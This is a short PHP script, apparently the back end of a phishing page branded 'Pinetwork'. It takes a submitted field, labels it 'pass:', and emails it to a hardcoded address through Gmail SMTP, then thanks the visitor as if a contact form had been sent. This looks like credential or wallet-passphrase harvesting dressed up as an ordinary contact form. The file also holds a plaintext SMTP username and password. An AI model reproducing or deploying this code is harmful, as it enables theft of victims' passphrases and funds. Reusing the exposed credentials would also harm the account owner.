<?php
session_start();
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'PHPMailer/src/Exception.php';
require 'PHPMailer/src/PHPMailer.php';
require 'PHPMailer/src/SMTP.php';

if (isset($_POST['submit'])) {
    $message = $_POST['textarea-498'];
//Create an instance; passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    //$mail->SMTPDebug = SMTP::DEBUG_SERVER;                      //Enable verbose debug output
    $mail->isSMTP();                                            //Send using SMTP
    $mail->SMTPAuth   = true;                                   //Enable SMTP authentication

    $mail->Host       = 'smtp.gmail.com';                     //Set the SMTP server to send through
    $mail->Username   = 'sondvtgcd201619@fpt.edu.vn';                     //SMTP username
    $mail->Password   = 'scsoklmrondvqcic';                               //SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;            //Enable implicit TLS encryption
    $mail->Port       = 587;                                    //TCP port to connect to; use 587 if you have set `SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS`

    //Recipients
    $mail->setFrom('sondvtgcd201619@fpt.edu.vn', 'Pinetwork');
    $mail->addAddress('sondvtgcd201619@fpt.edu.vn', 'Pinetwork');     //Add a recipient


    //Content
    $mail->isHTML(true);                                  //Set email format to HTML
    $mail->Subject = 'Pinetword';
    $mail->Body    = '<h3>pass:'.$message.'<h3>';
if($mail->send())
{
    $_SESSION['status'] = "Thank you contact us";
    header("location:{$_SERVER["HTTP_REFERER"]}");
    exit(0);
}
else
{
    $_SESSION['status'] = "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    header("location:{$_SERVER["HTTP_REFERER"]}");

    exit(0);
}


} catch (Exception $e) {
    echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
}
}
else{
    header('location: index.php');
    exit(0);
}
?>